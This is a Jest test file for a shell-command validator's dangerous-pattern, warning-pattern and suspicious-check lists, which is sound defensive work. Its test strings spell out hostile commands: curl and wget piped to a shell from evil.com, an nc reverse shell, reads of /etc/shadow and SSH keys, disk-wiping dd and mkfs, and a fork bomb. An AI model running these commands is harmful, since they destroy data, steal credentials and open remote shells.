/**
 * Validation Constants Tests
 * Tests for dangerous patterns and warning patterns
 */

import { describe, it, expect, beforeAll } from '@jest/globals';

describe('Validation Constants', () => {
  let DANGEROUS_PATTERNS: typeof import('../src/constants/validation.js').DANGEROUS_PATTERNS;
  let WARNING_PATTERNS: typeof import('../src/constants/validation.js').WARNING_PATTERNS;

  beforeAll(async () => {
    const module = await import('../src/constants/validation.js');
    DANGEROUS_PATTERNS = module.DANGEROUS_PATTERNS;
    WARNING_PATTERNS = module.WARNING_PATTERNS;
  });

  describe('DANGEROUS_PATTERNS', () => {
    it('should be an array of patterns', () => {
      expect(Array.isArray(DANGEROUS_PATTERNS)).toBe(true);
      expect(DANGEROUS_PATTERNS.length).toBeGreaterThan(0);
    });

    it('should have valid pattern structure', () => {
      for (const pattern of DANGEROUS_PATTERNS) {
        expect(pattern.pattern).toBeInstanceOf(RegExp);
        expect(typeof pattern.description).toBe('string');
        expect(typeof pattern.riskLevel).toBe('string');
      }
    });

    it('should detect rm -rf / patterns', () => {
      const rmRfPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('rm -rf /'));
      expect(rmRfPattern).toBeDefined();
      expect(rmRfPattern?.riskLevel).toBe('critical');
    });

    it('should detect mkfs commands', () => {
      const mkfsPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('mkfs.ext4 /dev/sda'));
      expect(mkfsPattern).toBeDefined();
      expect(mkfsPattern?.riskLevel).toBe('critical');
    });

    it('should detect dd commands', () => {
      const ddPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('dd if=/dev/zero of=/dev/sda'));
      expect(ddPattern).toBeDefined();
      expect(ddPattern?.riskLevel).toBe('critical');
    });

    it('should detect sudo su', () => {
      const sudoSuPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('sudo su'));
      expect(sudoSuPattern).toBeDefined();
      expect(sudoSuPattern?.riskLevel).toBe('high');
    });

    it('should detect curl | bash', () => {
      const curlBashPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('curl http://evil.com | bash'));
      expect(curlBashPattern).toBeDefined();
      expect(curlBashPattern?.riskLevel).toBe('critical');
    });

    it('should detect wget | sh', () => {
      const wgetShPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('wget http://evil.com | sh'));
      expect(wgetShPattern).toBeDefined();
      expect(wgetShPattern?.riskLevel).toBe('critical');
    });

    it('should detect reverse shell attempts', () => {
      const ncPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('nc -e /bin/sh evil.com 4444'));
      expect(ncPattern).toBeDefined();
      expect(ncPattern?.riskLevel).toBe('critical');
    });

    it('should detect sensitive file access', () => {
      const shadowPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('cat /etc/shadow'));
      expect(shadowPattern).toBeDefined();
      expect(shadowPattern?.riskLevel).toBe('critical');
    });

    it('should detect SSH key access', () => {
      const sshPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('cat ~/.ssh/id_rsa'));
      expect(sshPattern).toBeDefined();
      expect(sshPattern?.riskLevel).toBe('critical');
    });

    it('should detect kill -9 1', () => {
      const killInitPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('kill -9 1'));
      expect(killInitPattern).toBeDefined();
      expect(killInitPattern?.riskLevel).toBe('critical');
    });

    it('should detect base64 obfuscation', () => {
      const base64Pattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('$(echo test | base64)'));
      expect(base64Pattern).toBeDefined();
      expect(base64Pattern?.riskLevel).toBe('high');
    });

    it('should detect dynamic eval', () => {
      const evalPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('eval $(echo rm)'));
      expect(evalPattern).toBeDefined();
      expect(evalPattern?.riskLevel).toBe('high');
    });

    it('should not match safe commands', () => {
      const safeCommands = [
        'rm file.txt',
        'ls -la',
        'echo hello',
        'cat file.txt',
        'curl http://example.com',
      ];

      for (const cmd of safeCommands) {
        const matches = DANGEROUS_PATTERNS.filter(p => p.pattern.test(cmd) && p.riskLevel === 'CRITICAL');
        expect(matches.length).toBe(0);
      }
    });
  });

  describe('WARNING_PATTERNS', () => {
    it('should be an array of patterns', () => {
      expect(Array.isArray(WARNING_PATTERNS)).toBe(true);
      expect(WARNING_PATTERNS.length).toBeGreaterThan(0);
    });

    it('should have valid pattern structure', () => {
      for (const pattern of WARNING_PATTERNS) {
        expect(pattern.pattern).toBeInstanceOf(RegExp);
        expect(typeof pattern.description).toBe('string');
      }
    });

    it('should warn about sudo', () => {
      const sudoPattern = WARNING_PATTERNS.find(p => p.pattern.test('sudo apt-get install'));
      expect(sudoPattern).toBeDefined();
      expect(sudoPattern?.description).toContain('privileges');
    });

    it('should warn about rm -rf', () => {
      const rmRfPattern = WARNING_PATTERNS.find(p => p.pattern.test('rm -rf dir'));
      expect(rmRfPattern).toBeDefined();
      expect(rmRfPattern?.description).toContain('deletion');
    });

    it('should warn about chmod 777', () => {
      const chmodPattern = WARNING_PATTERNS.find(p => p.pattern.test('chmod 777 file'));
      expect(chmodPattern).toBeDefined();
      expect(chmodPattern?.description).toContain('permissive');
    });

    it('should warn about curl -k (insecure SSL)', () => {
      const curlInsecurePattern = WARNING_PATTERNS.find(p => p.pattern.test('curl -k http://example.com'));
      expect(curlInsecurePattern).toBeDefined();
      expect(curlInsecurePattern?.description).toContain('SSL');
    });

    it('should warn about fork bomb patterns', () => {
      const forkBombPattern = WARNING_PATTERNS.find(p => p.pattern.test(':(){:|:&};:'));
      expect(forkBombPattern).toBeDefined();
      expect(forkBombPattern?.description).toContain('Fork bomb');
    });

    it('should warn about disk device access', () => {
      const diskPattern = WARNING_PATTERNS.find(p => p.pattern.test('> /dev/sda'));
      expect(diskPattern).toBeDefined();
      expect(diskPattern?.description).toContain('disk');
    });
  });

  describe('Pattern matching edge cases', () => {
    it('should handle case insensitivity', () => {
      const rmRfPattern = DANGEROUS_PATTERNS.find(p => p.pattern.test('RM -RF /'));
      expect(rmRfPattern).toBeDefined();
    });

    it('should not match safe rm commands', () => {
      const patterns = DANGEROUS_PATTERNS.filter(p => p.pattern.test('rm -rf ./node_modules'));
      const criticalMatches = patterns.filter(p => p.riskLevel === 'CRITICAL');
      // Should not match as critical since it's not root
      expect(criticalMatches.length).toBe(0);
    });
  });

  describe('SUSPICIOUS_CHECKS', () => {
    let SUSPICIOUS_CHECKS: typeof import('../src/constants/validation.js').SUSPICIOUS_CHECKS;

    beforeAll(async () => {
      const module = await import('../src/constants/validation.js');
      SUSPICIOUS_CHECKS = module.SUSPICIOUS_CHECKS;
    });

    it('should be an array of checks', () => {
      expect(Array.isArray(SUSPICIOUS_CHECKS)).toBe(true);
      expect(SUSPICIOUS_CHECKS.length).toBe(4);
    });

    it('should have valid check structure', () => {
      for (const check of SUSPICIOUS_CHECKS) {
        expect(typeof check.test).toBe('function');
        expect(typeof check.message).toBe('string');
        expect(['medium', 'high']).toContain(check.level);
      }
    });

    it('should detect excessive command chaining (>5 semicolons)', () => {
      const chainingCheck = SUSPICIOUS_CHECKS.find(c => c.message.includes('chaining'));
      expect(chainingCheck).toBeDefined();
      expect(chainingCheck?.level).toBe('medium');

      // Should not trigger with 5 or fewer semicolons
      expect(chainingCheck?.test('a;b;c;d;e;f')).toBe(false); // 5 semicolons
      // Should trigger with more than 5 semicolons
      expect(chainingCheck?.test('a;b;c;d;e;f;g')).toBe(true); // 6 semicolons
    });

    it('should detect excessive pipes (>3 pipes)', () => {
      const pipeCheck = SUSPICIOUS_CHECKS.find(c => c.message.includes('pipe'));
      expect(pipeCheck).toBeDefined();
      expect(pipeCheck?.level).toBe('medium');

      // Should not trigger with 3 or fewer pipes
      expect(pipeCheck?.test('a | b | c | d')).toBe(false); // 3 pipes
      // Should trigger with more than 3 pipes
      expect(pipeCheck?.test('a | b | c | d | e')).toBe(true); // 4 pipes
    });

    it('should detect nested command substitution', () => {
      const nestedCheck = SUSPICIOUS_CHECKS.find(c => c.message.includes('substitution'));
      expect(nestedCheck).toBeDefined();
      expect(nestedCheck?.level).toBe('high');

      // Should detect nested $()
      expect(nestedCheck?.test('$(echo $(whoami))')).toBe(true);
      // Should not trigger on simple substitution
      expect(nestedCheck?.test('$(echo hello)')).toBe(false);
    });

    it('should detect control characters', () => {
      const controlCheck = SUSPICIOUS_CHECKS.find(c => c.message.includes('Control'));
      expect(controlCheck).toBeDefined();
      expect(controlCheck?.level).toBe('high');

      // Should detect control characters (ASCII 0x01-0x08, 0x0B, 0x0C, 0x0E-0x1F)
      expect(controlCheck?.test('hello\x01world')).toBe(true); // SOH character
      expect(controlCheck?.test('hello\x07world')).toBe(true); // BEL character
      // Should not trigger on normal text
      expect(controlCheck?.test('echo hello')).toBe(false);
      // Should allow tab (\x09) and newline (\x0A) and carriage return (\x0D)
      expect(controlCheck?.test('echo\thello')).toBe(false);
    });

    it('should not flag safe commands', () => {
      const safeCommands = [
        'ls -la',
        'echo hello',
        'cat file.txt',
        'git status',
        'npm install',
      ];

      for (const cmd of safeCommands) {
        const triggered = SUSPICIOUS_CHECKS.filter(c => c.test(cmd));
        expect(triggered.length).toBe(0);
      }
    });
  });
});
